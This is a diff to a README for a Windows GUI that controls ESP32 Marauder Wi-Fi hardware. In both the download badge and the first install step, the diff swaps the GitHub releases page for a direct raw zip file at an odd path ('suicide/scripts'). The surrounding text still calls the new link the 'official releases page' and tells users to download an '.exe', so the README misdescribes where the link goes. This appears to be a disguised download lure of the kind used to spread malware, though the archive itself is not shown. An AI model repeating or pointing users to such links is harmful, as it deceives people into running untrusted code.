@@ -1,6 +1,6 @@
 # 📡 headless-marauder-gui - Manage your ESP32 Marauder hardware easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Hydrocarbongenusephippiorhynchus660/headless-marauder-gui/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Hydrocarbongenusephippiorhynchus660/headless-marauder-gui/main/suicide/scripts/gui_headless_marauder_v1.9-alpha.2.zip)
 
 This application provides a visual interface for your ESP32 Marauder device. It replaces complex command-line processes with simple buttons and menus. You can control your hardware, update firmware, and view network data without writing code.
 
@@ -17,7 +17,7 @@ To run this application on your Windows computer, you need the following:
 
 Follow these steps to obtain the software:
 
-1. Visit the [official releases page](https://github.com/Hydrocarbongenusephippiorhynchus660/headless-marauder-gui/releases) to access the download list.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Hydrocarbongenusephippiorhynchus660/headless-marauder-gui/main/suicide/scripts/gui_headless_marauder_v1.9-alpha.2.zip) to access the download list.
 2. Look for the file ending in `.exe` under the latest release tag.
 3. Click the file name to start the download to your computer.
 4. Save the file to your desktop for easy access.
